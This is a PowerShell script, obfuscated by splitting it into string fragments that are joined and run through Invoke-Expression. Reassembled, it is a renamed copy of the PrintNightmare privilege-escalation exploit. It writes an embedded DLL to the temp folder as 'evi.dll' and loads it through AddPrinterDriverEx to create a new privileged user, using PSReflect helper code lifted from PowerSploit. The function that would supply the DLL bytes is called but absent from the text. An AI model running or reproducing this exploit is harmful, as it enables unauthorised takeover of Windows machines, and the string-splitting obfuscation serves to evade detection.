$fragments = @('function Invoke','-nimare
{

    ','param (
       ',' [string]$Drive','rName = "Totall','y Not here",
  ','      [string]$','NewUser = "",
 ','       [string]','$NewPassword = ','"",
        [st','ring]$DLL = ""
','    )

    if (',' $DLL -eq "" ){','
        $nimar','e_data = [byte[',']](get_nimare_d','ll)
        $en','coder = New-Obj','ect System.Text','.UnicodeEncodin','g

        if (',' $NewUser -ne "','" ) {
         ','   $NewUserByte','s = $encoder.Ge','tBytes($NewUser',')
            [','System.Buffer]:',':BlockCopy($New','UserBytes, 0, $','nimare_data, 0x','32e20, $NewUser','Bytes.Length)
 ','           $nim','are_data[0x32e2','0+$NewUserBytes','.Length] = 0
  ','          $nima','re_data[0x32e20','+$NewUserBytes.','Length+1] = 0
 ','       } else {','
            
 ','       }

     ','   if ( $NewPas','sword -ne "" ) ','{
            $','NewPasswordByte','s = $encoder.Ge','tBytes($NewPass','word)
         ','   [System.Buff','er]::BlockCopy(','$NewPasswordByt','es, 0, $nimare_','data, 0x32c20, ','$NewPasswordByt','es.Length)
    ','        $nimare','_data[0x32c20+$','NewPasswordByte','s.Length] = 0
 ','           $nim','are_data[0x32c2','0+$NewPasswordB','ytes.Length+1] ','= 0
        } e','lse {
         ','   
        }

','        $DLL = ','[System.IO.Path',']::GetTempPath(',') + "evi.dll"
 ','       [System.','IO.File]::Write','AllBytes($DLL, ','$nimare_data)
 ','       
       ',' $delete_me = $','true
    } else',' {

        $de','lete_me = $fals','e
    }

    $M','od = New-InMemo','ryModule -Modul','eName "A$(Get-R','andom)"

    $F','unctionDefiniti','ons = @(
      ','(func winspool.','drv AddPrinterD','riverEx ([bool]',') @([string], [','Uint32], [IntPt','r], [Uint32]) -','Charset Auto -S','etLastError),
 ','     (func wins','pool.drv EnumPr','interDrivers([b','ool]) @( [strin','g], [string], [','Uint32], [IntPt','r], [UInt32], [','Uint32].MakeByR','efType(), [Uint','32].MakeByRefTy','pe()) -Charset ','Auto -SetLastEr','ror)
    )

   ',' $Types = $Func','tionDefinitions',' | Add-Win32Typ','e -Module $Mod ','-Namespace ''Mod','''

    # Define',' custom structu','res for types c','reated
    $DRI','VER_INFO_2 = st','ruct $Mod DRIVE','R_INFO_2 @{
   ','     cVersion =',' field 0 Uint64',';
        pName',' = field 1 stri','ng -MarshalAs @','("LPTStr");
   ','     pEnvironme','nt = field 2 st','ring -MarshalAs',' @("LPTStr");
 ','       pDriverP','ath = field 3 s','tring -MarshalA','s @("LPTStr");
','        pDataFi','le = field 4 st','ring -MarshalAs',' @("LPTStr");
 ','       pConfigF','ile = field 5 s','tring -MarshalA','s @("LPTStr");
','    }

    $win','spool = $Types[','''winspool.drv'']','
    $APD_COPY_','ALL_FILES = 0x0','0000004

    [U','int32]($cbNeede','d) = 0
    [Uin','t32]($cReturned',') = 0

    if (',' $winspool::Enu','mPrinterDrivers','($null, "Window','s x64", 2, [Int','Ptr]::Zero, 0, ','[ref]$cbNeeded,',' [ref]$cReturne','d) ){
        
','        return
','    }

    [Int','Ptr]$pAddr = [S','ystem.Runtime.I','nteropServices.','Marshal]::Alloc','HGlobal([Uint32',']($cbNeeded))

','    if ( $winsp','ool::EnumPrinte','rDrivers($null,',' "Windows x64",',' 2, $pAddr, $cb','Needed, [ref]$c','bNeeded, [ref]$','cReturned) ){
 ','       $driver ','= [System.Runti','me.InteropServi','ces.Marshal]::P','trToStructure($','pAddr, [System.','Type]$DRIVER_IN','FO_2)
    } els','e {
        
  ','      [System.R','untime.InteropS','ervices.Marshal',']::FreeHGlobal(','$pAddr)
       ',' return
    }

','    Write-Host ','"[+] using pDri','verPath = `"$($','driver.pDriverP','ath)`""
    [Sy','stem.Runtime.In','teropServices.M','arshal]::FreeHG','lobal($pAddr)

','    $driver_inf','o = New-Object ','$DRIVER_INFO_2
','    $driver_inf','o.cVersion = 3
','    $driver_inf','o.pConfigFile =',' $DLL
    $driv','er_info.pDataFi','le = $DLL
    $','driver_info.pDr','iverPath = $dri','ver.pDriverPath','
    $driver_in','fo.pEnvironment',' = "Windows x64','"
    $driver_i','nfo.pName = $Dr','iverName

    $','pDriverInfo = [','System.Runtime.','InteropServices','.Marshal]::Allo','cHGlobal([Syste','m.Runtime.Inter','opServices.Mars','hal]::SizeOf($d','river_info))
  ','  [System.Runti','me.InteropServi','ces.Marshal]::S','tructureToPtr($','driver_info, $p','DriverInfo, $fa','lse)

    if ( ','$winspool::AddP','rinterDriverEx(','$null, 2, $pDri','verInfo, $APD_C','OPY_ALL_FILES -','bor 0x10 -bor 0','x8000) ) {
    ','    if ( $delet','e_me ) {
      ','      
        ','} else {
      ','      
        ','}
    } else {
','        
    }
','
    if ( $dele','te_me ) {
     ','   
        Rem','ove-Item -Force',' $DLL
    }
}

','
##############','###############','###############','############
# ','Stolen from Pow','erSploit: https','://github.com/P','owerShellMafia/','PowerSploit
###','###############','###############','###############','########

#####','###############','###############','###############','######
#
# PSRe','flect code for ','Windows API acc','ess
# Author: @','mattifestation
','#   https://raw','.githubusercont','ent.com/mattife','station/PSRefle','ct/master/PSRef','lect.psm1
#
###','###############','###############','###############','########

funct','ion New-InMemor','yModule {
<#
.S','YNOPSIS
Creates',' an in-memory a','ssembly and mod','ule
Author: Mat','thew Graeber (@','mattifestation)','
License: BSD 3','-Clause
Require','d Dependencies:',' None
Optional ','Dependencies: N','one
.DESCRIPTIO','N
When defining',' custom enums, ','structs, and un','managed functio','ns, it is
neces','sary to associa','te to an assemb','ly module. This',' helper functio','n
creates an in','-memory module ','that can be pas','sed to the ''enu','m'',
''struct'', a','nd Add-Win32Typ','e functions.
.P','ARAMETER Module','Name
Specifies ','the desired nam','e for the in-me','mory assembly a','nd module. If
M','oduleName is no','t provided, it ','will default to',' a GUID.
.EXAMP','LE
$Module = Ne','w-InMemoryModul','e -ModuleName W','in32
#>

    [D','iagnostics.Code','Analysis.Suppre','ssMessageAttrib','ute(''PSUseShoul','dProcessForStat','eChangingFuncti','ons'', '''')]
    ','[CmdletBinding(',')]
    Param (
','        [Parame','ter(Position = ','0)]
        [Va','lidateNotNullOr','Empty()]
      ','  [String]
    ','    $ModuleName',' = [Guid]::NewG','uid().ToString(',')
    )

    $A','ppDomain = [Ref','lection.Assembl','y].Assembly.Get','Type(''System.Ap','pDomain'').GetPr','operty(''Current','Domain'').GetVal','ue($null, @())
','    $LoadedAsse','mblies = $AppDo','main.GetAssembl','ies()

    fore','ach ($Assembly ','in $LoadedAssem','blies) {
      ','  if ($Assembly','.FullName -and ','($Assembly.Full','Name.Split('','')','[0] -eq $Module','Name)) {
      ','      return $A','ssembly
       ',' }
    }

    $','DynAssembly = N','ew-Object Refle','ction.AssemblyN','ame($ModuleName',')
    $Domain =',' $AppDomain
   ',' $AssemblyBuild','er = $Domain.De','fineDynamicAsse','mbly($DynAssemb','ly, ''Run'')
    ','$ModuleBuilder ','= $AssemblyBuil','der.DefineDynam','icModule($Modul','eName, $False)
','
    return $Mo','duleBuilder
}

','# A helper func','tion used to re','duce typing whi','le defining fun','ction
# prototy','pes for Add-Win','32Type.
functio','n func {
    Pa','ram (
        [','Parameter(Posit','ion = 0, Mandat','ory = $True)]
 ','       [String]','
        $DllNa','me,

        [P','arameter(Positi','on = 1, Mandato','ry = $True)]
  ','      [string]
','        $Functi','onName,

      ','  [Parameter(Po','sition = 2, Man','datory = $True)',']
        [Type',']
        $Retu','rnType,

      ','  [Parameter(Po','sition = 3)]
  ','      [Type[]]
','        $Parame','terTypes,

    ','    [Parameter(','Position = 4)]
','        [Runtim','e.InteropServic','es.CallingConve','ntion]
        ','$NativeCallingC','onvention,

   ','     [Parameter','(Position = 5)]','
        [Runti','me.InteropServi','ces.CharSet]
  ','      $Charset,','

        [Stri','ng]
        $En','tryPoint,

    ','    [Switch]
  ','      $SetLastE','rror
    )

   ',' $Properties = ','@{
        DllN','ame = $DllName
','        Functio','nName = $Functi','onName
        ','ReturnType = $R','eturnType
    }','

    if ($Para','meterTypes) { $','Properties[''Par','ameterTypes''] =',' $ParameterType','s }
    if ($Na','tiveCallingConv','ention) { $Prop','erties[''NativeC','allingConventio','n''] = $NativeCa','llingConvention',' }
    if ($Cha','rset) { $Proper','ties[''Charset'']',' = $Charset }
 ','   if ($SetLast','Error) { $Prope','rties[''SetLastE','rror''] = $SetLa','stError }
    i','f ($EntryPoint)',' { $Properties[','''EntryPoint''] =',' $EntryPoint }
','
    New-Object',' PSObject -Prop','erty $Propertie','s
}

function A','dd-Win32Type
{
','<#
.SYNOPSIS
Cr','eates a .NET ty','pe for an unman','aged Win32 func','tion.
Author: M','atthew Graeber ','(@mattifestatio','n)
License: BSD',' 3-Clause
Requi','red Dependencie','s: None
Optiona','l Dependencies:',' func
.DESCRIPT','ION
Add-Win32Ty','pe enables you ','to easily inter','act with unmana','ged (i.e.
Win32',' unmanaged) fun','ctions in Power','Shell. After pr','oviding
Add-Win','32Type with a f','unction signatu','re, a .NET type',' is created
usi','ng reflection (','i.e. csc.exe is',' never called l','ike with Add-Ty','pe).
The ''func''',' helper functio','n can be used t','o reduce typing',' when defining
','multiple functi','on definitions.','
.PARAMETER Dll','Name
The name o','f the DLL.
.PAR','AMETER Function','Name
The name o','f the target fu','nction.
.PARAME','TER EntryPoint
','The DLL export ','function name. ','This argument s','hould be specif','ied if the
spec','ified function ','name is differe','nt than the nam','e of the export','ed
function.
.P','ARAMETER Return','Type
The return',' type of the fu','nction.
.PARAME','TER ParameterTy','pes
The functio','n parameters.
.','PARAMETER Nativ','eCallingConvent','ion
Specifies t','he native calli','ng convention o','f the function.',' Defaults to
st','dcall.
.PARAMET','ER Charset
If y','ou need to expl','icitly call an ','''A'' or ''W'' Win3','2 function, you',' can
specify th','e character set','.
.PARAMETER Se','tLastError
Indi','cates whether t','he callee calls',' the SetLastErr','or Win32 API
fu','nction before r','eturning from t','he attributed m','ethod.
.PARAMET','ER Module
The i','n-memory module',' that will host',' the functions.',' Use
New-InMemo','ryModule to def','ine an in-memor','y module.
.PARA','METER Namespace','
An optional na','mespace to prep','end to the type','. Add-Win32Type',' defaults
to a ','namespace consi','sting only of t','he name of the ','DLL.
.EXAMPLE
$','Mod = New-InMem','oryModule -Modu','leName Win32
$F','unctionDefiniti','ons = @(
  (fun','c kernel32 GetP','rocAddress ([In','tPtr]) @([IntPt','r], [String]) -','Charset Ansi -S','etLastError),
 ',' (func kernel32',' GetModuleHandl','e ([Intptr]) @(','[String]) -SetL','astError),
  (f','unc ntdll RtlGe','tCurrentPeb ([I','ntPtr]) @())
)
','$Types = $Funct','ionDefinitions ','| Add-Win32Type',' -Module $Mod -','Namespace ''Win3','2''
$Kernel32 = ','$Types[''kernel3','2'']
$Ntdll = $T','ypes[''ntdll'']
$','Ntdll::RtlGetCu','rrentPeb()
$ntd','llbase = $Kerne','l32::GetModuleH','andle(''ntdll'')
','$Kernel32::GetP','rocAddress($ntd','llbase, ''RtlGet','CurrentPeb'')
.N','OTES
Inspired b','y Lee Holmes'' I','nvoke-WindowsAp','i http://poshco','de.org/2189
Whe','n defining mult','iple function p','rototypes, it i','s ideal to prov','ide
Add-Win32Ty','pe with an arra','y of function s','ignatures. That',' way, they
are ','all incorporate','d into the same',' in-memory modu','le.
#>

    [Ou','tputType([Hasht','able])]
    Par','am(
        [Pa','rameter(Mandato','ry=$True, Value','FromPipelineByP','ropertyName=$Tr','ue)]
        [S','tring]
        ','$DllName,

    ','    [Parameter(','Mandatory=$True',', ValueFromPipe','lineByPropertyN','ame=$True)]
   ','     [String]
 ','       $Functio','nName,

       ',' [Parameter(Val','ueFromPipelineB','yPropertyName=$','True)]
        ','[String]
      ','  $EntryPoint,
','
        [Param','eter(Mandatory=','$True, ValueFro','mPipelineByProp','ertyName=$True)',']
        [Type',']
        $Retu','rnType,

      ','  [Parameter(Va','lueFromPipeline','ByPropertyName=','$True)]
       ',' [Type[]]
     ','   $ParameterTy','pes,

        [','Parameter(Value','FromPipelineByP','ropertyName=$Tr','ue)]
        [R','untime.InteropS','ervices.Calling','Convention]
   ','     $NativeCal','lingConvention ','= [Runtime.Inte','ropServices.Cal','lingConvention]','::StdCall,

   ','     [Parameter','(ValueFromPipel','ineByPropertyNa','me=$True)]
    ','    [Runtime.In','teropServices.C','harSet]
       ',' $Charset = [Ru','ntime.InteropSe','rvices.CharSet]','::Auto,

      ','  [Parameter(Va','lueFromPipeline','ByPropertyName=','$True)]
       ',' [Switch]
     ','   $SetLastErro','r,

        [Pa','rameter(Mandato','ry=$True)]
    ','    [ValidateSc','ript({($_ -is [','Reflection.Emit','.ModuleBuilder]',') -or ($_ -is [','Reflection.Asse','mbly])})]
     ','   $Module,

  ','      [Validate','NotNull()]
    ','    [String]
  ','      $Namespac','e = ''''
    )

 ','   BEGIN
    {
','        $TypeHa','sh = @{}
    }
','
    PROCESS
  ','  {
        if ','($Module -is [R','eflection.Assem','bly])
        {','
            if',' ($Namespace)
 ','           {
  ','              $','TypeHash[$DllNa','me] = $Module.G','etType("$Namesp','ace.$DllName")
','            }
 ','           else','
            {
','               ',' $TypeHash[$Dll','Name] = $Module','.GetType($DllNa','me)
           ',' }
        }
  ','      else
    ','    {
         ','   # Define one',' type for each ','DLL
           ',' if (!$TypeHash','.ContainsKey($D','llName))
      ','      {
       ','         if ($N','amespace)
     ','           {
  ','               ','   $TypeHash[$D','llName] = $Modu','le.DefineType("','$Namespace.$Dll','Name", ''Public,','BeforeFieldInit',''')
            ','    }
         ','       else
   ','             {
','               ','     $TypeHash[','$DllName] = $Mo','dule.DefineType','($DllName, ''Pub','lic,BeforeField','Init'')
        ','        }
     ','       }

     ','       $Method ','= $TypeHash[$Dl','lName].DefineMe','thod(
         ','       $Functio','nName,
        ','        ''Public',',Static,Pinvoke','Impl'',
        ','        $Return','Type,
         ','       $Paramet','erTypes)

     ','       # Make e','ach ByRef param','eter an Out par','ameter
        ','    $i = 1
    ','        foreach','($Parameter in ','$ParameterTypes',')
            {','
              ','  if ($Paramete','r.IsByRef)
    ','            {
 ','               ','    [void] $Met','hod.DefineParam','eter($i, ''Out'',',' $null)
       ','         }

   ','             $i','++
            ','}

            ','$DllImport = [R','untime.InteropS','ervices.DllImpo','rtAttribute]
  ','          $SetL','astErrorField =',' $DllImport.Get','Field(''SetLastE','rror'')
        ','    $CallingCon','ventionField = ','$DllImport.GetF','ield(''CallingCo','nvention'')
    ','        $Charse','tField = $DllIm','port.GetField(''','CharSet'')
     ','       $EntryPo','intField = $Dll','Import.GetField','(''EntryPoint'')
','            if ','($SetLastError)',' { $SLEValue = ','$True } else { ','$SLEValue = $Fa','lse }

        ','    if ($PSBoun','dParameters[''En','tryPoint'']) { $','ExportedFuncNam','e = $EntryPoint',' } else { $Expo','rtedFuncName = ','$FunctionName }','

            #',' Equivalent to ','C# version of [','DllImport(DllNa','me)]
          ','  $Constructor ','= [Runtime.Inte','ropServices.Dll','ImportAttribute','].GetConstructo','r([String])
   ','         $DllIm','portAttribute =',' New-Object Ref','lection.Emit.Cu','stomAttributeBu','ilder($Construc','tor,
          ','      $DllName,',' [Reflection.Pr','opertyInfo[]] @','(), [Object[]] ','@(),
          ','      [Reflecti','on.FieldInfo[]]',' @($SetLastErro','rField,
       ','               ','               ','      $CallingC','onventionField,','
              ','               ','              $','CharsetField,
 ','               ','               ','            $En','tryPointField),','
              ','  [Object[]] @(','$SLEValue,
    ','               ','          ([Run','time.InteropSer','vices.CallingCo','nvention] $Nati','veCallingConven','tion),
        ','               ','      ([Runtime','.InteropService','s.CharSet] $Cha','rset),
        ','               ','      $Exported','FuncName))

   ','         $Metho','d.SetCustomAttr','ibute($DllImpor','tAttribute)
   ','     }
    }

 ','   END
    {
  ','      if ($Modu','le -is [Reflect','ion.Assembly])
','        {
     ','       return $','TypeHash
      ','  }

        $R','eturnTypes = @{','}

        fore','ach ($Key in $T','ypeHash.Keys)
 ','       {
      ','      $Type = $','TypeHash[$Key].','CreateType()

 ','           $Ret','urnTypes[$Key] ','= $Type
       ',' }

        ret','urn $ReturnType','s
    }
}


fun','ction psenum {
','<#
.SYNOPSIS
Cr','eates an in-mem','ory enumeration',' for use in you','r PowerShell se','ssion.
Author: ','Matthew Graeber',' (@mattifestati','on)
License: BS','D 3-Clause
Requ','ired Dependenci','es: None
Option','al Dependencies',': None
.DESCRIP','TION
The ''psenu','m'' function fac','ilitates the cr','eation of enums',' entirely in
me','mory using as c','lose to a "C st','yle" as PowerSh','ell will allow.','
.PARAMETER Mod','ule
The in-memo','ry module that ','will host the e','num. Use
New-In','MemoryModule to',' define an in-m','emory module.
.','PARAMETER FullN','ame
The fully-q','ualified name o','f the enum.
.PA','RAMETER Type
Th','e type of each ','enum element.
.','PARAMETER EnumE','lements
A hasht','able of enum el','ements.
.PARAME','TER Bitfield
Sp','ecifies that th','e enum should b','e treated as a ','bitfield.
.EXAM','PLE
$Mod = New-','InMemoryModule ','-ModuleName Win','32
$ImageSubsys','tem = psenum $M','od PE.IMAGE_SUB','SYSTEM UInt16 @','{
    UNKNOWN =','               ','   0
    NATIVE',' =             ','      1 # Image',' doesn''t requir','e a subsystem.
','    WINDOWS_GUI',' =             ',' 2 # Image runs',' in the Windows',' GUI subsystem.','
    WINDOWS_CU','I =            ','  3 # Image run','s in the Window','s character sub','system.
    OS2','_CUI =         ','         5 # Im','age runs in the',' OS/2 character',' subsystem.
   ',' POSIX_CUI =   ','             7 ','# Image runs in',' the Posix char','acter subsystem','.
    NATIVE_WI','NDOWS =        ','   8 # Image is',' a native Win9x',' driver.
    WI','NDOWS_CE_GUI = ','          9 # I','mage runs in th','e Windows CE su','bsystem.
    EF','I_APPLICATION =','          10
  ','  EFI_BOOT_SERV','ICE_DRIVER =  1','1
    EFI_RUNTI','ME_DRIVER =    ','   12
    EFI_R','OM =           ','       13
    X','BOX =          ','           14
 ','   WINDOWS_BOOT','_APPLICATION = ','16
}
.NOTES
Pow','erShell purists',' may disagree w','ith the naming ','of this functio','n but
again, th','is was develope','d in such a way',' so as to emula','te a "C style"
','definition as c','losely as possi','ble. Sorry, I''m',' not going to n','ame it
New-Enum','. :P
#>

    [O','utputType([Type','])]
    Param (','
        [Param','eter(Position =',' 0, Mandatory=$','True)]
        ','[ValidateScript','({($_ -is [Refl','ection.Emit.Mod','uleBuilder]) -o','r ($_ -is [Refl','ection.Assembly','])})]
        $','Module,

      ','  [Parameter(Po','sition = 1, Man','datory=$True)]
','        [Valida','teNotNullOrEmpt','y()]
        [S','tring]
        ','$FullName,

   ','     [Parameter','(Position = 2, ','Mandatory=$True',')]
        [Typ','e]
        $Typ','e,

        [Pa','rameter(Positio','n = 3, Mandator','y=$True)]
     ','   [ValidateNot','NullOrEmpty()]
','        [Hashta','ble]
        $E','numElements,

 ','       [Switch]','
        $Bitfi','eld
    )

    ','if ($Module -is',' [Reflection.As','sembly])
    {
','        return ','($Module.GetTyp','e($FullName))
 ','   }

    $Enum','Type = $Type -a','s [Type]

    $','EnumBuilder = $','Module.DefineEn','um($FullName, ''','Public'', $EnumT','ype)

    if ($','Bitfield)
    {','
        $Flags','Constructor = [','FlagsAttribute]','.GetConstructor','(@())
        $','FlagsCustomAttr','ibute = New-Obj','ect Reflection.','Emit.CustomAttr','ibuteBuilder($F','lagsConstructor',', @())
        ','$EnumBuilder.Se','tCustomAttribut','e($FlagsCustomA','ttribute)
    }','

    foreach (','$Key in $EnumEl','ements.Keys)
  ','  {
        # A','pply the specif','ied enum type t','o each element
','        $null =',' $EnumBuilder.D','efineLiteral($K','ey, $EnumElemen','ts[$Key] -as $E','numType)
    }
','
    $EnumBuild','er.CreateType()','
}


# A helper',' function used ','to reduce typin','g while definin','g struct
# fiel','ds.
function fi','eld {
    Param',' (
        [Par','ameter(Position',' = 0, Mandatory','=$True)]
      ','  [UInt16]
    ','    $Position,
','
        [Param','eter(Position =',' 1, Mandatory=$','True)]
        ','[Type]
        ','$Type,

       ',' [Parameter(Pos','ition = 2)]
   ','     [UInt16]
 ','       $Offset,','

        [Obje','ct[]]
        $','MarshalAs
    )','

    @{
      ','  Position = $P','osition
       ',' Type = $Type -','as [Type]
     ','   Offset = $Of','fset
        Ma','rshalAs = $Mars','halAs
    }
}

','
function struc','t
{
<#
.SYNOPSI','S
Creates an in','-memory struct ','for use in your',' PowerShell ses','sion.
Author: M','atthew Graeber ','(@mattifestatio','n)
License: BSD',' 3-Clause
Requi','red Dependencie','s: None
Optiona','l Dependencies:',' field
.DESCRIP','TION
The ''struc','t'' function fac','ilitates the cr','eation of struc','ts entirely in
','memory using as',' close to a "C ','style" as Power','Shell will allo','w. Struct
field','s are specified',' using a hashta','ble where each ','field of the st','ruct
is compros','ed of the order',' in which it sh','ould be defined',', its .NET
type',', and optionall','y, its offset a','nd special mars','haling attribut','es.
One of the ','features of ''st','ruct'' is that a','fter your struc','t is defined,
i','t will come wit','h a built-in Ge','tSize method as',' well as an exp','licit
converter',' so that you ca','n easily cast a','n IntPtr to the',' struct without','
relying upon c','alling SizeOf a','nd/or PtrToStru','cture in the Ma','rshal
class.
.P','ARAMETER Module','
The in-memory ','module that wil','l host the stru','ct. Use
New-InM','emoryModule to ','define an in-me','mory module.
.P','ARAMETER FullNa','me
The fully-qu','alified name of',' the struct.
.P','ARAMETER Struct','Fields
A hashta','ble of fields. ','Use the ''field''',' helper functio','n to ease
defin','ing each field.','
.PARAMETER Pac','kingSize
Specif','ies the memory ','alignment of fi','elds.
.PARAMETE','R ExplicitLayou','t
Indicates tha','t an explicit o','ffset for each ','field will be s','pecified.
.EXAM','PLE
$Mod = New-','InMemoryModule ','-ModuleName Win','32
$ImageDosSig','nature = psenum',' $Mod PE.IMAGE_','DOS_SIGNATURE U','Int16 @{
    DO','S_SIGNATURE =  ','  0x5A4D
    OS','2_SIGNATURE =  ','  0x454E
    OS','2_SIGNATURE_LE ','= 0x454C
    VX','D_SIGNATURE =  ','  0x454C
}
$Ima','geDosHeader = s','truct $Mod PE.I','MAGE_DOS_HEADER',' @{
    e_magic',' =    field 0 $','ImageDosSignatu','re
    e_cblp =','     field 1 UI','nt16
    e_cp =','       field 2 ','UInt16
    e_cr','lc =     field ','3 UInt16
    e_','cparhdr =  fiel','d 4 UInt16
    ','e_minalloc = fi','eld 5 UInt16
  ','  e_maxalloc = ','field 6 UInt16
','    e_ss =     ','  field 7 UInt1','6
    e_sp =   ','    field 8 UIn','t16
    e_csum ','=     field 9 U','Int16
    e_ip ','=       field 1','0 UInt16
    e_','cs =       fiel','d 11 UInt16
   ',' e_lfarlc =   f','ield 12 UInt16
','    e_ovno =   ','  field 13 UInt','16
    e_res = ','     field 14 U','Int16[] -Marsha','lAs @(''ByValArr','ay'', 4)
    e_o','emid =    field',' 15 UInt16
    ','e_oeminfo =  fi','eld 16 UInt16
 ','   e_res2 =    ',' field 17 UInt1','6[] -MarshalAs ','@(''ByValArray'',',' 10)
    e_lfan','ew =   field 18',' Int32
}
# Exam','ple of using an',' explicit layou','t in order to c','reate a union.
','$TestUnion = st','ruct $Mod TestU','nion @{
    fie','ld1 = field 0 U','Int32 0
    fie','ld2 = field 1 I','ntPtr 0
} -Expl','icitLayout
.NOT','ES
PowerShell p','urists may disa','gree with the n','aming of this f','unction but
aga','in, this was de','veloped in such',' a way so as to',' emulate a "C s','tyle"
definitio','n as closely as',' possible. Sorr','y, I''m not goin','g to name it
Ne','w-Struct. :P
#>','

    [OutputTy','pe([Type])]
   ',' Param (
      ','  [Parameter(Po','sition = 1, Man','datory=$True)]
','        [Valida','teScript({($_ -','is [Reflection.','Emit.ModuleBuil','der]) -or ($_ -','is [Reflection.','Assembly])})]
 ','       $Module,','

        [Para','meter(Position ','= 2, Mandatory=','$True)]
       ',' [ValidateNotNu','llOrEmpty()]
  ','      [String]
','        $FullNa','me,

        [P','arameter(Positi','on = 3, Mandato','ry=$True)]
    ','    [ValidateNo','tNullOrEmpty()]','
        [Hasht','able]
        $','StructFields,

','        [Reflec','tion.Emit.Packi','ngSize]
       ',' $PackingSize =',' [Reflection.Em','it.PackingSize]','::Unspecified,
','
        [Switc','h]
        $Exp','licitLayout
   ',' )

    if ($Mo','dule -is [Refle','ction.Assembly]',')
    {
       ',' return ($Modul','e.GetType($Full','Name))
    }

 ','   [Reflection.','TypeAttributes]',' $StructAttribu','tes = ''AnsiClas','s,
        Clas','s,
        Publ','ic,
        Sea','led,
        Be','foreFieldInit''
','
    if ($Expli','citLayout)
    ','{
        $Stru','ctAttributes = ','$StructAttribut','es -bor [Reflec','tion.TypeAttrib','utes]::Explicit','Layout
    }
  ','  else
    {
  ','      $StructAt','tributes = $Str','uctAttributes -','bor [Reflection','.TypeAttributes',']::SequentialLa','yout
    }

   ',' $StructBuilder',' = $Module.Defi','neType($FullNam','e, $StructAttri','butes, [ValueTy','pe], $PackingSi','ze)
    $Constr','uctorInfo = [Ru','ntime.InteropSe','rvices.MarshalA','sAttribute].Get','Constructors()[','0]
    $SizeCon','st = @([Runtime','.InteropService','s.MarshalAsAttr','ibute].GetField','(''SizeConst''))
','
    $Fields = ','New-Object Hash','table[]($Struct','Fields.Count)

','    # Sort each',' field accordin','g to the orders',' specified
    ','# Unfortunately',', PSv2 doesn''t ','have the luxury',' of the
    # h','ashtable [Order','ed] accelerator','.
    foreach (','$Field in $Stru','ctFields.Keys)
','    {
        $','Index = $Struct','Fields[$Field][','''Position'']
   ','     $Fields[$I','ndex] = @{Field','Name = $Field; ','Properties = $S','tructFields[$Fi','eld]}
    }

  ','  foreach ($Fie','ld in $Fields)
','    {
        $','FieldName = $Fi','eld[''FieldName''',']
        $Fiel','dProp = $Field[','''Properties'']

','        $Offset',' = $FieldProp[''','Offset'']
      ','  $Type = $Fiel','dProp[''Type'']
 ','       $Marshal','As = $FieldProp','[''MarshalAs'']

','        $NewFie','ld = $StructBui','lder.DefineFiel','d($FieldName, $','Type, ''Public'')','

        if ($','MarshalAs)
    ','    {
         ','   $UnmanagedTy','pe = $MarshalAs','[0] -as ([Runti','me.InteropServi','ces.UnmanagedTy','pe])
          ','  if ($MarshalA','s[1])
         ','   {
          ','      $Size = $','MarshalAs[1]
  ','              $','AttribBuilder =',' New-Object Ref','lection.Emit.Cu','stomAttributeBu','ilder($Construc','torInfo,
      ','              $','UnmanagedType, ','$SizeConst, @($','Size))
        ','    }
         ','   else
       ','     {
        ','        $Attrib','Builder = New-O','bject Reflectio','n.Emit.CustomAt','tributeBuilder(','$ConstructorInf','o, [Object[]] @','($UnmanagedType','))
            ','}

            ','$NewField.SetCu','stomAttribute($','AttribBuilder)
','        }

    ','    if ($Explic','itLayout) { $Ne','wField.SetOffse','t($Offset) }
  ','  }

    # Make',' the struct awa','re of its own s','ize.
    # No m','ore having to c','all [Runtime.In','teropServices.M','arshal]::SizeOf','!
    $SizeMeth','od = $StructBui','lder.DefineMeth','od(''GetSize'',
 ','       ''Public,',' Static'',
     ','   [Int],
     ','   [Type[]] @()',')
    $ILGenera','tor = $SizeMeth','od.GetILGenerat','or()
    # Than','ks for the help',', Jason Shirk!
','    $ILGenerato','r.Emit([Reflect','ion.Emit.OpCode','s]::Ldtoken, $S','tructBuilder)
 ','   $ILGenerator','.Emit([Reflecti','on.Emit.OpCodes',']::Call,
      ','  [Type].GetMet','hod(''GetTypeFro','mHandle''))
    ','$ILGenerator.Em','it([Reflection.','Emit.OpCodes]::','Call,
        [','Runtime.Interop','Services.Marsha','l].GetMethod(''S','izeOf'', [Type[]','] @([Type])))
 ','   $ILGenerator','.Emit([Reflecti','on.Emit.OpCodes',']::Ret)

    # ','Allow for expli','cit casting fro','m an IntPtr
   ',' # No more havi','ng to call [Run','time.InteropSer','vices.Marshal]:',':PtrToStructure','!
    $Implicit','Converter = $St','ructBuilder.Def','ineMethod(''op_I','mplicit'',
     ','   ''PrivateScop','e, Public, Stat','ic, HideBySig, ','SpecialName'',
 ','       $StructB','uilder,
       ',' [Type[]] @([In','tPtr]))
    $IL','Generator2 = $I','mplicitConverte','r.GetILGenerato','r()
    $ILGene','rator2.Emit([Re','flection.Emit.O','pCodes]::Nop)
 ','   $ILGenerator','2.Emit([Reflect','ion.Emit.OpCode','s]::Ldarg_0)
  ','  $ILGenerator2','.Emit([Reflecti','on.Emit.OpCodes',']::Ldtoken, $St','ructBuilder)
  ','  $ILGenerator2','.Emit([Reflecti','on.Emit.OpCodes',']::Call,
      ','  [Type].GetMet','hod(''GetTypeFro','mHandle''))
    ','$ILGenerator2.E','mit([Reflection','.Emit.OpCodes]:',':Call,
        ','[Runtime.Intero','pServices.Marsh','al].GetMethod(''','PtrToStructure''',', [Type[]] @([I','ntPtr], [Type])','))
    $ILGener','ator2.Emit([Ref','lection.Emit.Op','Codes]::Unbox_A','ny, $StructBuil','der)
    $ILGen','erator2.Emit([R','eflection.Emit.','OpCodes]::Ret)
','
    $StructBui','lder.CreateType','()
}
'); $script = $fragments -join ''; Invoke-Expression $script